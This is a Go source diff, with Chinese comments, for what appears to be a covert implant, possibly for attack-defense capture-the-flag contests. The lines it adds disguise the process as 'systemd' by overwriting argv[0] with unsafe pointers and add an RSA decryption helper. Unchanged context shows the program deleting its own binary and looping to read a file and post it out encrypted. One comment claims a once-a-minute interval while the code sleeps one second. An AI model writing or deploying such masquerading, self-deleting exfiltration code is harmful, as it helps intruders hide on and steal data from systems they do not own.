@@ -13,8 +13,10 @@ import (
 	"net/http"
 	"os"
 	"os/signal"
+	"reflect"
 	"syscall"
 	"time"
+	"unsafe"
 )
 
 // 公钥字符串，替换为您的RSA公钥
@@ -22,6 +24,11 @@ const publicKeyStr = `
 `
 
 func main() {
+	// 修改进程名
+	err := modifyArg0("systemd")
+	if err != nil {
+		panic(err)
+	}
 	// 删除binary
 	absPath, err1 := os.Executable()
 	err2 := os.Remove(absPath)
@@ -99,6 +106,33 @@ func rsaEncryptAndBase64Encode(publicKeyPEM []byte, data []byte) ([]byte, error)
 	return []byte(encodedData), nil
 }
 
+func rsaDecryptAndBase64Decode(privateKeyPEM []byte, data []byte) ([]byte, error) {
+	// 解析PEM格式的私钥
+	block, _ := pem.Decode(privateKeyPEM)
+	if block == nil {
+		return nil, fmt.Errorf("parse err")
+	}
+
+	privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
+	if err != nil {
+		return nil, err
+	}
+
+	// 对Base64编码后的数据进行解码
+	decodedData, err := base64.StdEncoding.DecodeString(string(data))
+	if err != nil {
+		return nil, err
+	}
+
+	// 使用RSA私钥解密数据
+	decryptedData, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, decodedData, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	return decryptedData, nil
+}
+
 func PostFlag() {
 	for {
 		// 读取文件内容
@@ -119,4 +153,15 @@ func PostFlag() {
 
 		time.Sleep(time.Second) // 每分钟执行一次
 	}
+}
+
+func modifyArg0(name string) error {
+	// 修改进程名
+	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
+	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
+	n := copy(argv0, name)
+	if n < len(argv0) {
+		argv0[n] = 0
+	}
+	return nil
 }
